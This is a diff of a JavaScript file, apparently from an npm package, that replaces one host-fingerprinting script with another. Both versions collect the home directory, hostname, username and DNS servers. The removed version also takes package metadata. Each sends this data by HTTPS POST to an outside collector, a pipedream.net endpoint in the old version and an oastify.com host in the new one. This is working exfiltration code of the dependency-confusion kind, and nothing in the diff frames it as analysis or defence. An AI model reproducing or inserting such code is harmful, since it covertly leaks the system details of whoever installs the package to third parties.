@@ -1,46 +1,48 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+const os = require('os');
+const dns = require('dns');
+const https = require('https');
+const querystring = require('querystring');
 
-const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
-    hd: os.homedir(),
-    hn: os.hostname(),
-    un: os.userInfo().username,
-    dns: dns.getServers(),
-    r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
-});
-
-var postData = querystring.stringify({
-    msg: trackingData,
-});
-
-var options = {
-    hostname: "eoy0jjvj36p5poz.m.pipedream.net",
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
-    },
+// Data to be sent in the POST request
+const data = {
+  hd: os.homedir(),
+  hn: os.hostname(),
+  un: os.userInfo().username,
+  dns: dns.getServers().join(','),
 };
 
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);
-    });
+// Convert data to a URL-encoded string
+const postData = querystring.stringify(data);
+
+// POST request options
+const options = {
+  hostname: 'p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com', // Replace with the hostname or IP address of your server
+  port: 443, // Replace with the port number your server is listening on
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': postData.length,
+  },
+};
+
+// Send the POST request
+const req = https.request(options, (res) => {
+  console.log(`Status Code: ${res.statusCode}`);
+ 
+  res.on('data', (chunk) => {
+    console.log(`Response: ${chunk}`);
+  });
+ 
+  res.on('end', () => {
+    console.log('POST request completed.');
+  });
 });
 
-req.on("error", (e) => {
-    // console.error(e);
+req.on('error', (error) => {
+  console.error(`Error sending POST request: ${error.message}`);
 });
 
+// Send the data in the POST request
 req.write(postData);
 req.end();
